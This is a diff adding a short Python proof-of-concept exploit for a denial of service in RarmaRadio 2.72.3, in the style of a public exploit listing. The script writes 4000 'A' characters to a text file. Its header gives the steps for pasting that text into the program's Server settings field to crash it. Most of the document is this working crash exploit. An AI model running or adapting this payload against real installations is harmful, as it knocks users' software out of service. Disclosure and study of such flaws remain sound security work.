@@ -1,0 +1,22 @@
+#Exploit Title: RarmaRadio 2.72.3 - 'Server' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-21
+#Vendor Homepage: http://www.raimersoft.com/
+#Software Link: www.raimersoft.com/downloads/rarmaradio_setup.exe
+#Tested Version: 2.72.3
+#Tested on: Windows 7 Service Pack 1 x64
+
+#Steps to produce the crash:
+#1.- Run python code: rarmaradio_server.py
+#2.- Open rarma_ser.txt and copy content to clipboard
+#3.- Open RarmaRadio
+#4.- Select "Edit" > "Settings" > "Network"
+#5.- In "Server" field paste Clipboard
+#6.- Select "OK"
+#7.- Crashed
+
+cod = "\x41" * 4000
+
+f = open('rarma_ser.txt', 'w')
+f.write(cod)
+f.close()
